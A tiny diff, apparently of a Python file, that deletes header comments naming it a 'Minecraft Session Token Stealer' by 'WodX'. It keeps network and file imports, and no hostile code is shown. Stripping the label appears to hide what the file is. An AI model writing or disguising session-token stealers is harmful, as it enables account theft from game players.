@@ -1,6 +1,3 @@
-# Minecraft Session Token Stealer
-# Author: WodX
-
 import json
 import os
 from urllib.request import Request, urlopen
